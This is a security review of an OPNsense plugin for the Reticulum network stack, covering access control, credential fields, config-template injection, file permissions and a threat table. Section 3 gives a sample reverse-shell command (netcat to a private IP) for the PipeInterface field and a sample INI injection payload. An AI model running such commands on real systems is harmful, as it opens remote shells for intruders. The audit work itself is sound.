# Security Notes — OPNsense Reticulum Plugin
**Date:** 2026-03-10
**Status:** final
**Source:** Phase 7 testing documentation — analysis of source code in `os-reticulum/src/`

---

## 1. Trust Model

### Access tiers

| Tier | Privilege Key | Reach |
|---|---|---|
| **Full admin** | `page-services-reticulum` | All GUI pages + all API endpoints (GET and POST) |
| **Read-only** | `page-services-reticulum-readonly` | GET endpoints only: get, searchInterfaces, getInterface, status, logs, info |
| **No privilege** | (none) | OPNsense core blocks access before any plugin code runs |

**Sources:**
- ACL definition: `src/opnsense/mvc/app/models/OPNsense/Reticulum/ACL/ACL.xml`
- Read-only pattern list explicitly names 13 GET endpoints; excludes all `set`, `add`, `del`, `toggle`, `start`, `stop`, `restart`, `reconfigure`

### What the read-only tier cannot do

The `page-services-reticulum-readonly` ACL omits these endpoints, so they return HTTP 403:

- `api/reticulum/rnsd/set`
- `api/reticulum/rnsd/addInterface`
- `api/reticulum/rnsd/setInterface/*`
- `api/reticulum/rnsd/delInterface/*`
- `api/reticulum/rnsd/toggleInterface/*`
- `api/reticulum/lxmd/set`
- `api/reticulum/service/rnsdStart` / `rnsdStop` / `rnsdRestart`
- `api/reticulum/service/lxmdStart` / `lxmdStop` / `lxmdRestart`
- `api/reticulum/service/reconfigure`

### CSRF protection

All POST endpoints inherit CSRF enforcement from `ApiControllerBase` (OPNsense base class). This is **not implemented in plugin code**; it is inherited automatically. The `ServiceController` additionally performs an explicit `$this->request->isPost()` guard (lines 17, 29, 43, etc.) before calling configd, returning `{'result': 'error', 'message': 'POST required'}` on GET attempts. Both layers are present.

**Source:** `src/opnsense/mvc/app/controllers/OPNsense/Reticulum/Api/ServiceController.php`

---

## 2. Sensitive Field Handling

### How UpdateOnlyTextField works

`ApiMutableModelControllerBase::getBase()` automatically omits any field typed `UpdateOnlyTextField` from GET responses. The value stored in `config.xml` is never serialized into the JSON response. On a `setBase()` call, if the field is absent from the POST body, the existing stored value is preserved (not cleared). This is the OPNsense framework's intended mechanism for write-only credentials.

Two fields use this type:

| Field | Model path | Note |
|---|---|---|
| `rpc_key` | `general.rpc_key` | Remote management authentication key |
| `passphrase` | `interfaces.interface[*].passphrase` | Per-interface IFAC credential |

**Source:** `src/opnsense/mvc/app/models/OPNsense/Reticulum/Reticulum.xml` lines 57, 140

### rpc_key validation

The `rpc_key` Mask is `/^([0-9a-f]{32,128})?$/` — empty string (unset) or 32–128 lowercase hex characters. **Design intent confirmed by model comment (line 55–56):** empty = unset; minimum 32 hex chars enforces 128-bit security when set. Earlier drafts of the model allowed 1-char values; the current mask closes that gap (minimum 32 chars when non-empty).

### passphrase validation

`passphrase` is declared as `<passphrase type="UpdateOnlyTextField" />` with **no Mask**. The value is rendered into the rnsd INI config at `reticulum_config.j2` line 49:

```jinja
  passphrase = {{ iface.passphrase|replace('\n', '')|replace('\r', '') }}
```

The template strips newlines and carriage returns but does **not** strip `[` or `]`. An INI section header requires a leading `[` at the start of a line; since newlines are stripped, a passphrase containing `[` cannot produce a new section. However, the `[` character itself would appear literally in the passphrase value, which is unlikely to be a problem for rnsd but is inconsistent with how other string fields are handled. **This is a Low-severity gap.**

---

## 3. Config Injection Analysis

### X-710: sub_interfaces_raw (RNodeMultiInterface) — Accepted Risk

**Field:** `sub_interfaces_raw` (TextField, no Mask)
**Template emission (reticulum_config.j2, lines 162–164):**

```jinja
{% elif iface.type == 'RNodeMultiInterface' %}
  port = {{ iface.port }}
{% if iface.sub_interfaces_raw|default('') != '' %}
{{ iface.sub_interfaces_raw }}
{% endif %}
```

The raw block is emitted **verbatim** with no filtering. An authenticated admin with `page-services-reticulum` privilege can store arbitrary INI text in this field, including:

```ini
[[[A]]]
frequency = 915000000

[reticulum]
  enable_transport = True
```

**What rnsd does with duplicate sections:** The Reticulum INI parser uses the **first occurrence** of a section. The legitimate `[reticulum]` section is always emitted at the top of `reticulum_config.j2` (lines 6–25) before any interface blocks. A second `[reticulum]` section injected via `sub_interfaces_raw` would be ignored or treated as a second anonymous section depending on the parser. Practical impact: an attacker cannot override the `[reticulum]` section's `enable_transport` or `rpc_key` via this vector; however, they **can** inject additional named interface sections or arbitrary key-value pairs into the config.

**Acknowledged in model (lines 411–418 of Reticulum.xml):**

> sub_interfaces_raw: SECURITY NOTE — this field is emitted verbatim into the Reticulum config file … Any authenticated admin with the reticulum ACL privilege can inject arbitrary INI content through this field. This is an accepted architectural trade-off. The GUI (Phase 5) must display a prominent warning.

**Test X-710 status:** The `[reticulum]` duplicate-section injection described in the test plan would be present in the config file but overridden by the first occurrence. The residual risk is that **additional interface sections** can be injected without going through the model's validation pipeline (no name mask, no type enum, no uniqueness check). These injected sections run as the `reticulum` service user with access to all identity material.

**Severity: Medium** — limited to users who already hold admin-level access; no privilege escalation; sub-user impact requires an attacker who is already a trusted admin.

**Residual risk:** No GUI warning was confirmed as implemented in Phase 5 (see Phase 5 known gaps in project memory). **This warning must be confirmed present before production.**

---

### X-707: PipeInterface command field

**Field:** `command` (TextField)
**Model Mask (Reticulum.xml, line 401):** `/^[^\n\r\[\]]{0,512}$/`
**Template emission (reticulum_config.j2, line 237):**

```jinja
{% elif iface.type == 'PipeInterface' %}
  command = {{ iface.command }}
```

The template emits the command value **without additional filtering**. The model Mask:
- Rejects newlines (`\n`, `\r`) — prevents injecting additional INI lines
- Rejects `[` and `]` — prevents injecting new INI sections
- Allows up to 512 characters of any other content, including shell metacharacters (`;`, `|`, `&`, `$`, backticks, etc.)

**How rnsd uses this field:** rnsd passes the `command` string to `subprocess.Popen()` (or equivalent). Reticulum's PipeInterface launches the command as a subprocess under the rnsd process user, which is `reticulum`. This is **by design** — PipeInterface is explicitly intended for user-supplied subprocess command strings.

**Threat assessment:**

- An authenticated admin submitting `command = /usr/bin/nc -e /bin/sh 10.0.0.1 4444` would cause rnsd to launch a reverse shell as the `reticulum` user on each PipeInterface start.
- The `reticulum` user's capabilities are bounded by service user isolation (see Section 4), not by any shell sandbox.
- This is **not a bug**; PipeInterface is a first-class rnsd feature. The risk is identical to any OPNsense plugin that allows admin-configured external process execution (e.g., OpenVPN `up` scripts).

**Mitigating factors:**
- Requires `page-services-reticulum` (full admin) privilege — same level that can already run arbitrary configd actions
- configd mediates the chain: PHP → configd socket → script → service rnsd → subprocess; no direct shell from PHP
- Runs as `reticulum` user, not root

**Recommendation:** The GUI textarea for `command` should display a security notice that the value is executed as a subprocess. The model comment at lines 393–399 documents this explicitly:

> SECURITY: if the script is writable by the reticulum user, this is a backdoor triggered by network traffic. Restrict to absolute executable paths in the GUI.

**Severity: Low** (by design, requires admin privilege, service user isolation applies)

---

### Passphrase in template: missing `[` strip

As noted in Section 2, `passphrase` in `reticulum_config.j2` line 49 strips `\n` and `\r` but not `[`. All other freeform string fields in the template also strip `[` (e.g., `iface.name` at line 37, `iface.network_name` at line 46, `iface.logfile` at line 30). This is an inconsistency.

Since `passphrase` has no Mask in the model, it could accept a `[` character. After newline stripping, the value lands on one line in the INI file: `  passphrase = some[value`. This cannot create a new INI section (which requires `[` at line start), so injection risk is nil, but the inconsistency should be addressed for completeness.

**Severity: Low** (no practical injection path; cosmetic inconsistency)

---

### logfile path restriction

Both `general.logfile` and `lxmf.logfile` are constrained by the model Mask:

```
/^\/var\/log\/reticulum\/[a-zA-Z0-9._-]{1,64}$/
```

This prevents path traversal (no `..`, no absolute paths to other directories). The template applies additional newline stripping (lines 30–31 of `reticulum_config.j2`). Correctly implemented; no gap.

---

## 4. Service User Isolation

### Identity

- **User:** `reticulum` (dedicated system user, not root, not www)
- **Group membership:** `dialer` group required for serial port access (`/dev/cuaU*`, etc.)
- **Virtualenv:** `/usr/local/reticulum-venv/` — Python interpreter and all Reticulum/LXMF packages isolated from system Python

Both services are launched via rc.d scripts that set the service user explicitly:

```sh
# src/etc/rc.d/rnsd, line 15
: ${rnsd_user:="reticulum"}

# src/etc/rc.d/lxmd, line 15
: ${lxmd_user:="reticulum"}
```

### What the reticulum user can access

- `/usr/local/etc/reticulum/` — config and identity key material
- `/usr/local/etc/lxmf/` — lxmd config, allowed/ignored lists
- `/var/db/reticulum/` — runtime data, routing tables, announce cache
- `/var/db/lxmf/` — message store, peer database
- `/var/log/reticulum/` — log files
- `/dev/cuaU*`, `/dev/tty*` (via dialer group) — serial/USB serial devices
- Virtualenv Python packages (read-only at runtime)

The `reticulum` user cannot directly access other OPNsense config, the root filesystem as root, or network namespaces controlled by other services.

### File permissions

**Config directories (runtime creation, rc.d prestart):**
```sh
# rnsd rc.d lines 32–35
mkdir -p "${rnsd_config}"
chown ${rnsd_user}:${rnsd_user} "${rnsd_config}"
```

The rc.d scripts create directories owned by `reticulum:reticulum` but **do not set an explicit mode**. `mkdir` defaults to `umask`-modified `0777`, which is typically `0755` on FreeBSD. For a directory holding identity key material, **mode 700 is strongly recommended** per test X-703.

Test X-703 specifies: `/usr/local/etc/reticulum/` owned by reticulum, mode 700. This restriction must be set explicitly; the current rc.d prestart does not enforce it. This is a **gap**.

**Log files:**
Managed by `newsyslog` via `src/etc/newsyslog.conf.d/reticulum.conf`:
```
/var/log/reticulum/rnsd.log  reticulum:reticulum  640  5  10240  *  C
/var/log/reticulum/lxmd.log  reticulum:reticulum  640  5  10240  *  C
```

Mode 640: readable by owner (`reticulum`) and group, not world. Appropriate.

**Identity files:** Reticulum generates identity key files inside the config directory on first run. Their permissions are controlled by Reticulum itself (not by this plugin). The test plan's X-704 ("identity files not world-readable") depends on rnsd's own umask at startup. The rc.d script does not set `umask` before launching rnsd. If the system umask is 022, identity files would be created mode 644 (world-readable). **This is a Medium-severity gap.**

**Severity: Medium** — gaps in X-703 (config dir mode) and X-704 (identity file umask).

---

## 5. configd Isolation Model

All service control flows through configd, not through direct shell execution from PHP:

```
Browser → OPNsense MVC (PHP) → configd socket → actions_reticulum.conf → shell script / service command
```

**Source:** `src/opnsense/service/conf/actions.d/actions_reticulum.conf`

PHP never calls `exec()`, `shell_exec()`, or `system()`. The `Backend::configdRun()` call sends an action name and optional parameters over the configd Unix socket. configd runs as root but executes the mapped commands with the permissions defined by the action type. `service rnsd start` runs the rc.d script, which in turn runs rnsd as the `reticulum` user.

### Log tail parameter

The `logs.rnsd` and `logs.lxmd` actions use a `%s` parameter substituted into `tail -n %s`:

```ini
[logs.rnsd]
command:tail -n %s /var/log/reticulum/rnsd.log
parameters:%s
```

In `ServiceController.php` (lines 233–237), the `$lines` value is sanitized before being passed to configd:

```php
$lines = $this->request->get('lines', 'int', 200);
$lines = min(max($lines, 10), 500);
```

The `'int'` type cast in `$this->request->get()` ensures the value is an integer before the `min`/`max` clamp. This prevents injection through the `%s` parameter. Correctly implemented.

---

## 6. lxmd Dependency Enforcement: Dual-Layer Design

The rnsd→lxmd dependency is enforced at two independent layers:

**Layer 1 — rc.d (boot time):**
```sh
# REQUIRE: rnsd  (lxmd rc.d line 6)
```
FreeBSD's `rcorder` will not start lxmd before rnsd at boot time.

**Layer 2 — rc.d prestart (runtime):**
```sh
lxmd_prestart() {
    if ! service rnsd status >/dev/null 2>&1; then
        echo "rnsd is not running."
        return 1
    fi
}
```
Prevents manual `service lxmd start` when rnsd is stopped.

**Layer 3 — API (GUI/API-initiated start):**
`ServiceController::lxmdStartAction()` calls `configdRun('reticulum status.rnsd')` and checks `$rnsdStatus['status'] === 'running'` before issuing the start command (lines 73–82). Returns an error message if rnsd is not running.

**Gap:** There is no enforcement preventing `service lxmd restart` from succeeding when rnsd is stopped mid-session. The API's `lxmdRestartAction()` (lines 107–128) also performs the rnsd status check. However, `lxmd_prestart()` in the rc.d script would still catch this at the shell level, so runtime protection is consistent.

**Unresolved behavior (test S-405):** When rnsd is stopped while lxmd is already running, lxmd's behavior is undefined by this plugin — it depends on lxmd's own resilience to its underlying Reticulum instance disappearing. This should be documented as a known behavioral gap rather than a security issue.

---

## 7. Threat Model Table

| Threat | Mitigated By | Residual Risk | Severity |
|---|---|---|---|
| Unauthenticated API access | OPNsense core ACL enforcement | None — no bypass path in plugin | None |
| Read-only user escalates to write | ACL.xml explicitly enumerates allowed patterns; write endpoints excluded | None if ACL correctly applied | None |
| CSRF on state-changing POST | `ApiControllerBase` base class; explicit `isPost()` guard in `ServiceController` | None | None |
| Sensitive field (rpc_key, passphrase) returned in GET | `UpdateOnlyTextField` handled by MVC base — never serialized | None | None |
| Config injection via freeform text fields | Model Masks reject `\n`, `\r`, `[`, `]` on all structured fields; template applies additional `replace()` filters | `passphrase` template missing `[` strip (no practical path) | Low |
| INI section injection via sub_interfaces_raw | Accepted architectural trade-off; first `[reticulum]` wins; requires full admin privilege | Additional arbitrary interface sections injected without model validation | Medium |
| Arbitrary command execution via PipeInterface | Requires full admin privilege; configd chain; reticulum user isolation | Subprocess inherits reticulum user's full filesystem and device access | Low (by design) |
| Config dir world-readable (X-703) | None confirmed — rc.d prestart does not set mode 700 | Identity key material readable by any local user if umask is 022 | Medium |
| Identity files world-readable (X-704) | None confirmed — rc.d does not set umask before launching rnsd | Identity keys exposed to local users if system umask is 022 | Medium |
| Log tail parameter injection | Integer cast + min/max clamp in ServiceController; configd %s substitution | None | None |
| Path traversal via logfile field | Model Mask restricts to `/var/log/reticulum/[alphanum]{1,64}` | None | None |
| on_inbound script execution via network traffic | Mask requires absolute path; script executes as reticulum user | Script must be non-writable by reticulum user; not enforced by plugin | Medium |
| lxmd starts without rnsd | rc.d REQUIRE + prestart check + API pre-check (3 layers) | lxmd behavior when rnsd stops mid-session is undefined | Low |

---

## 8. Findings from Reading Actual Source Code

The following observations emerged from reading source files directly, beyond what the test plan specifies.

### F-1: passphrase missing `[` strip in template (Low)

`reticulum_config.j2` line 49 does not strip `[` from the passphrase value, unlike all other freeform string fields. The model has no Mask for this field. The inconsistency is cosmetic (no practical injection path after newline stripping) but should be made consistent.

**File:** `src/opnsense/service/templates/OPNsense/Reticulum/reticulum_config.j2`, line 49

### F-2: Config directory mode not enforced (Medium)

`src/etc/rc.d/rnsd` lines 32–35 create `/usr/local/etc/reticulum/` without specifying mode `700`. Test X-703 expects mode 700. A post-`mkdir` `chmod 700` call is missing.

**File:** `src/etc/rc.d/rnsd`, line 34

### F-3: No umask set before rnsd launch (Medium)

Neither `src/etc/rc.d/rnsd` nor `src/etc/rc.d/lxmd` sets `umask 077` before starting the service. Reticulum generates identity key files in the config directory on first run. Without an explicit umask, identity key files inherit the system default (typically 022 → mode 644), making them world-readable.

**File:** `src/etc/rc.d/rnsd` (missing `umask 077` call in `rnsd_prestart()`)

### F-4: on_inbound is a network-triggered script execution path (Medium)

`lxmf.on_inbound` is an optional absolute path to a script executed by lxmd on every inbound LXMF message. The model comment (Reticulum.xml lines 533–535) identifies this correctly:

> SECURITY: if the script is writable by the reticulum user, this is a backdoor triggered by network traffic.

The model Mask allows any absolute path with no extension or directory restriction. The plugin does not enforce that the target script is owned by root or mode 555. This is a Medium-severity architectural note — the feature is legitimate, but administrators must be warned that the script's permissions are their responsibility.

### F-5: ServiceController read endpoints have no POST guard (by design)

`rnsdStatusAction()`, `rnstatusAction()`, `infoAction()`, `rnsdLogsAction()`, `lxmdLogsAction()`, and `lxmdStatusAction()` do not check `$this->request->isPost()` — because they are GET endpoints. The absence of an `isPost()` guard is correct. The pattern seen in the write actions is not needed here.

### F-6: lxmd_prestart uses `service rnsd status` which may not be reliable on all OPNsense versions

`src/etc/rc.d/lxmd` line 38 calls `service rnsd status`. On OPNsense (FreeBSD-based), this runs `rcvar`-aware status checks. If the `rnsd` service was not registered or the status script returns non-zero for reasons other than "not running" (e.g., script error), lxmd start would fail silently. This is an operational robustness note, not a security issue.

### F-7: Read-only ACL includes log endpoints (by design)

`api/reticulum/service/rnsdLogs` and `api/reticulum/service/lxmdLogs` are included in the `page-services-reticulum-readonly` ACL. Log content may include IP addresses, identity hashes, and connection metadata. This is an appropriate design decision for a monitoring role, but administrators should be aware that read-only users can observe operational data from logs.

---

## 9. Security Test Checklist (Phase 7)

Tests from `docs/phase7-testing.md` section 7, with analysis status:

| Test | Description | Expected Outcome | Analysis Status |
|---|---|---|---|
| X-701 | rnsd runs as reticulum user | `ps aux` shows rnsd owned by reticulum | Enforced by rc.d `rnsd_user` |
| X-702 | lxmd runs as reticulum user | `ps aux` shows lxmd owned by reticulum | Enforced by rc.d `lxmd_user` |
| X-703 | Config dir mode 700 | `ls -ld /usr/local/etc/reticulum` → drwx------ | **Gap: rc.d does not set mode 700** |
| X-704 | Identity files not world-readable | Mode 600 on identity key files | **Gap: no umask set before launch** |
| X-705 | GET rnsd/get omits rpc_key | JSON response has no rpc_key key | By design: UpdateOnlyTextField |
| X-706 | GET interface omits passphrase | JSON response has no passphrase key | By design: UpdateOnlyTextField |
| X-707 | PipeInterface command injection | No shell injection through config.xml | Not a bug; model Mask prevents INI injection; shell execution is by design |
| X-708 | POST endpoints reject GET | 405 or error JSON | Enforced by `isPost()` guard + MVC base |
| X-709 | CSRF token required | POST without token → 403 | Enforced by `ApiControllerBase` |
| X-710 | sub_interfaces_raw injection | Injected `[reticulum]` present but first wins | Confirmed by template structure; medium residual risk |

---

## 10. Recommendations

### Must fix before production

1. **[Medium] Set config directory permissions in rc.d prestart.** Add `chmod 700 "${rnsd_config}"` after `chown` in `rnsd_prestart()`. Same for `lxmd_prestart()`. Closes X-703.

2. **[Medium] Set restrictive umask before service launch.** Add `umask 077` at the top of `rnsd_prestart()` and `lxmd_prestart()`. This causes Reticulum to create identity key files at mode 600. Closes X-704.

3. **[Medium] Confirm GUI warning on sub_interfaces_raw textarea.** Phase 5 notes a known gap that the sub_interfaces_raw security warning may not be implemented. This warning is the stated mitigation for X-710 in the model comments. Verify it is rendered in `interfaces.volt`.

### Should fix

4. **[Low] Add `[` strip to passphrase in reticulum_config.j2 line 49.** Change to `{{ iface.passphrase|replace('\n', '')|replace('\r', '')|replace('[', '') }}` for consistency with all other freeform string fields.

5. **[Low] Add GUI guidance for on_inbound field.** Display a note that the target script should be owned by root and not writable by the `reticulum` user.

6. **[Low] Add GUI guidance for PipeInterface command field.** Display a security notice consistent with the model comment.

### Verify at test time

7. Confirm `api/reticulum/service/rnsdLogs` and `lxmdLogs` correctly enforce the integer clamp (10–500 lines) against adversarial input via the `lines` parameter.
8. Confirm that the `lxmdStop` action (which does not check rnsd status) correctly stops lxmd regardless of rnsd state. This is the intended behavior but should be explicitly tested.
